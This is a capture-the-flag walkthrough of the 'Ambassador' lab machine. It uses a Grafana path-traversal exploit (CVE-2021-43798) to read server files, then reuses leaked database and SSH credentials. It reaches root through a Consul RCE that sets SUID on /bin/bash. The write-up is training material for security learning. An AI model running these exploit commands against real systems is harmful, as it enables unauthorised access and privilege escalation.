# Ambassador, Difficulty: Medium
## Author : Arkoov
![Ambassador](https://user-images.githubusercontent.com/86551419/211179555-54ffa8ba-dc18-49c2-9798-b1ac06f0ccbe.png)

# Walkthrough (User):
1. Start by enumerating the machine using nmap

> command

```sh
nmap -sT -A 10.10.11.183
```

> result


![image](https://user-images.githubusercontent.com/86551419/211159598-e581f080-9224-43d8-8eb9-31d97f090ea7.png)


3. the result shows open port for `ssh(22), apacheserver(80), mysql(3306),and ppp(3000)`. we can start by visiting the port in the machine.

> result 

![image](https://user-images.githubusercontent.com/86551419/211185429-505d7f67-c4ed-48d8-8fb8-e8df725dc7d6.png)


4. There's nothing that we can use in port `80`.In port `3000` we are redirected to login page of Grafana. at the bottom of the page we found the version of Grafana that is currently running `v8.20`
> result

![image](https://user-images.githubusercontent.com/86551419/211161853-43db6a5a-9995-4b83-97c6-c58e48802885.png)


5. After searching about Grafana we found an interesting exploit to try. The exploit is for Grafana's `Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)`. This vulnerability affects Grafana `8.0.0-beta1 to 8.3.0.` which includes the machine's version.
> reference

![image](https://user-images.githubusercontent.com/86551419/211160507-dfdf466a-6c5b-48e4-9e46-a23b35abcccf.png)

6. We can try using the exploit by creating a txt file containing url of the grafana web service alongside with the port `http://10.10.11.183:3000` and start the exploit using the command below:

> code

```sh
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
cd exploit-grafana-CVE-2021-43798
pip install -r requirements.txt
```

> result

![image](https://user-images.githubusercontent.com/86551419/211161617-4ffb0de4-15c2-401f-9087-2e3cec3854bc.png)

7. when the bruteforcing is done. we get `http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd` which after checking it in the website we can access the /etc/passwd content.

> result 

![image](https://user-images.githubusercontent.com/86551419/211162119-48381a0b-3e56-41e1-8f1f-43cddfaff955.png)

![image](https://user-images.githubusercontent.com/86551419/211161753-493949ab-da0a-4a73-8ebf-1901388f2dfd.png)

8. There's also a few files that successfully found in the server which are dumped to a folder.

> result

![image](https://user-images.githubusercontent.com/86551419/211162078-2471f642-6410-45ff-a419-00a2d8389f12.png)

9. inside `grafana.ini` we found user admin credential for grafana web server. But after logging in we still could'nt find any clue.
> result 
![image](https://user-images.githubusercontent.com/86551419/211162364-14f6e9e6-f0dd-420d-a947-837d0d51c3c3.png)

10. after checking what dbms is used in `grafana.db`. we found that the database file is sqlite database `version 3.x`. we can open the sqlite file using sqlitebrowser.

> result

![image](https://user-images.githubusercontent.com/86551419/211162502-3a924ce8-cdc9-4e9b-aeb4-624c1e030829.png)

11. inside the database file we have multiple tables and inside data_source table we found a mysql user credential `user: grafana and password: dontStandSoCloseToMe63221!`

> result

![image](https://user-images.githubusercontent.com/86551419/211162613-765729e7-8de0-4198-a9b7-61e2f40b4312.png)

![image](https://user-images.githubusercontent.com/86551419/211162656-d43d0ca7-f7ca-44c2-b1b5-f094ab683932.png)

12. We can open mysql command line interface using the code below:

> code
```sh
mysql -h 10.10.11.183 -u grafana -p -P 3306
```
> result

![image](https://user-images.githubusercontent.com/86551419/211162937-8c7ad3c5-80e9-4065-9251-3efacc5d71fe.png)

![image](https://user-images.githubusercontent.com/86551419/211162953-4cf754d9-fca5-4cc2-89db-17b892186857.png)

13. Inside whackywidget database there's a users table which contains a developer credential
username: developer and password: YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== (base64 encoded)

> result

![image](https://user-images.githubusercontent.com/86551419/211163000-5635f334-14d7-4361-ab84-48016625b82e.png)

![image](https://user-images.githubusercontent.com/86551419/211163007-e3357c7d-39ec-4006-8c3a-d79e89a71b23.png)

14. Using the command below we decode the password and try to login into ssh using the credential

> code

```sh
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
```
```sh
  ssh developer@10.10.11.183
```
> result

![image](https://user-images.githubusercontent.com/86551419/211163106-08c36c0d-be31-462d-9a5f-938f610f2703.png)

![image](https://user-images.githubusercontent.com/86551419/211163197-f20a5fb1-4a06-45fc-8539-e3bc6b39b879.png)

15. with that, we have successfully captured the user flag!!

> result

![image](https://user-images.githubusercontent.com/86551419/211163226-be452390-a92f-49dc-a757-550f89354a4a.png)

# Walkthrough (Root):

1. Starting in privilege escalation we tried to check for root files that can be executed by user using command `sudo -l` but nothing came out.

> result

![image](https://user-images.githubusercontent.com/86551419/211178541-ba4c7cdf-3060-45a4-abdf-58c70a0cc407.png)

2. After searching around the directory, we stumbled upon a directory in /opt named my-app. In the directory we found a .git file that we can access using `git show` to list all the commits so far.

> result

![image](https://user-images.githubusercontent.com/86551419/211178643-3c7e8220-d19b-45ab-bae3-9c5987750ed8.png)

3. Theres a consul token inside the commit. after searching about consul in the web we found a known vulnerability int the services API. with the vulnerability we can execute a remote command(RCE). 

> Reference
Link: https://github.com/owalid/consul-rce

![image](https://user-images.githubusercontent.com/86551419/211179081-5e454776-95ad-4de5-b976-e182a9e78673.png)

4. After trying it in our machine using the token inside the commit, we will be able to change the permission for /bin/bash with `chmod +s /bin/bash`:

> command
```sh
consul_rce.py -th 127.0.0.1 -tp 8500 -ct bb03b43b-1d81-d62b-24b5-39540ee469b5 -c "/bin/bash -c 'chmod +s /bin/bash'"
```
> result

![image](https://user-images.githubusercontent.com/86551419/211179351-ac64af95-af27-4dd6-8ce7-d55a05fc91a2.png)

5. Done, next we just need to execute `/bin/bash` to get the root flag. 
> command
```sh
/bin/bash -p
```
> result

![image](https://user-images.githubusercontent.com/86551419/211179416-119ccbd1-0b12-4ac7-b89d-d64b0dcaca4a.png)

![image](https://user-images.githubusercontent.com/86551419/211179421-354ad6ba-3765-4b38-841b-67b0d496079d.png)

6. With the root flag found, we have successfully pwned the machine. This machine is pretty straight forward compared to another machine with the same difficulty. Happy Hacking!!

## Reference Link:
1. https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
2. https://github.com/owalid/consul-rce
